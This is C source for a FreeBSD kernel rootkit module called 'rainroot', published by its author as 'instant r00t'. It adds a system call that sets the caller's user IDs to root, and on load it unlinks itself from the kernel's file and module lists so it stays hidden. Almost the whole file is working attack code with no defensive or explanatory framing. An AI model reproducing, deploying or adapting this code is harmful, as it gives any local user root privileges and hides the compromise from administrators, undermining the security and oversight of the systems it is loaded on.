/* 
	instant r00t :)
	ancient code, time to publish 
	by -

	added code for hiding the module
	basic hide code was built some years back during reading
	BSD Rootkits by Joseph Kong, it is quite nice have a look!
 */	

#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/imgact.h>
#include <sys/linker.h>
#include <sys/libkern.h>
#include <sys/sysproto.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/_mutex.h>
#include <sys/sx.h>

#include <vm/vm.h>
#include <vm/vm_page.h>
#include <vm/vm_map.h>

#define HIDEMOD "rainroot.ko"
#define HIDE	"rainroot"

extern linker_file_list_t linker_files;
static struct mtx kld_mtx;
extern int next_file_id;

typedef TAILQ_HEAD(,module) modulelist_t;
extern modulelist_t modules;
extern int nextid;

struct module {
	TAILQ_ENTRY(module) link;
	TAILQ_ENTRY(module) flink;
	struct linker_file *file;
	int refs;
	int id;
	char *name;
	modeventhand_t	handler;
	void *arg;
	modspecific_t data;
};

/*
 * The function for implementing the syscall.
 */

static int
gimme_rude (struct thread *td, void *arg)
{
	td->td_proc->p_ucred->cr_uid=0;
	td->td_proc->p_ucred->cr_ruid=0;
	td->td_proc->p_ucred->cr_uid=0;
	td->td_proc->p_ucred->cr_uid=0;
return 0;
}

static struct sysent gimme_rude_sysent = {
	0,			/* sy_narg */
	gimme_rude		/* sy_call */
};

static int offset = NO_SYSCALL;

static int
load (struct module *module, int cmd, void *arg)
{
	struct linker_file *lf;
	struct module *mod;
	mtx_init(&kld_mtx, "hide lock",NULL,MTX_DEF);
	mtx_lock(&Giant);
	mtx_lock(&kld_mtx);

	(&linker_files)->tqh_first->refs--;

	TAILQ_FOREACH(lf, &linker_files,link)
	{
	if (strcmp(lf->filename,HIDEMOD)==0){
	next_file_id--;
	TAILQ_REMOVE(&linker_files,lf,link);
	break;
	}
	}

	mtx_unlock(&kld_mtx);
	mtx_unlock(&Giant);

	sx_xlock(&modules_sx);

	TAILQ_FOREACH(mod, &modules, link){
	if(strcmp(mod->name,HIDE)==0){
	nextid--;
	TAILQ_REMOVE(&modules,mod,link);
	break;
	}
	}

	sx_unlock(&modules_sx);

	return(0);
}
SYSCALL_MODULE(syscall, &offset, &gimme_rude_sysent, load, NULL);
